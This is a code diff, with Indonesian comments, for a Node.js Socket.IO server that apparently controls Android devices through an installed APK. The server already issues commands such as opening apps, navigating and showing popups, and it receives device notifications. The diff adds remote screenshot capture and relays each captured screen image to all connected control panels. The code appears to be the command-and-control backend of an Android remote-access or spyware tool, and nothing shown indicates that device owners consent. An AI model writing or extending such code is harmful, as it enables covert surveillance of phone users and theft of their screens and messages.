@@ -194,7 +194,9 @@ else if (command === 'open-app') {
 else if (command === 'navigation') {
     console.log(`🧭 [NAVIGATION] SENDING -> ${deviceName} (${deviceId}) | ACTION: ${params?.action}`);
 }
-    
+    else if (command === 'screenshot') {
+    console.log(`📸 [SCREENSHOT] CAPTURING -> ${deviceName} (${deviceId})`);
+}
     res.json({ success: true, commandId, message: 'Command sent' });
 });
 
@@ -286,6 +288,14 @@ app.post('/api/device/command/result', (req, res) => {
                 console.log(`❌ [POPUP] FAILED -> ${deviceName}`);
             }
         }
+
+        else if (deviceCommands[commandIndex].command === 'screenshot') {
+    if (status === 'completed') {
+        console.log(`✅ [SCREENSHOT] SUCCESS -> ${deviceName} | SCREENSHOT TAKEN`);
+    } else {
+        console.log(`❌ [SCREENSHOT] FAILED -> ${deviceName}`);
+    }
+}
     
      
 else if (deviceCommands[commandIndex].command === 'open-app') {
@@ -376,6 +386,29 @@ io.on('connection', (socket) => {
         });
     });
     
+    // ===== SCREENSHOT DARI APK =====
+socket.on('screenshot', (data) => {
+    const { deviceId, imageData, timestamp } = data;
+    
+    // Validasi device
+    if (!deviceId) return;
+    
+    // Update last seen device
+    if (devices.has(deviceId)) {
+        const device = devices.get(deviceId);
+        device.lastSeen = new Date().toISOString();
+        devices.set(deviceId, device);
+    }
+    
+    // Kirim screenshot ke semua panel
+    io.emit('screenshot', {
+        deviceId,
+        imageData,
+        timestamp: timestamp || Date.now()
+    });
+    
+    console.log(`📸 [SCREENSHOT] RECEIVED from ${deviceId} - ${(imageData.length * 0.75 / 1024).toFixed(2)}KB`);
+});
     // ===== NOTIFICATION DARI APK =====
     socket.on('notification', (data) => {
         const { deviceId, package: packageName, text, title, content, time } = data;
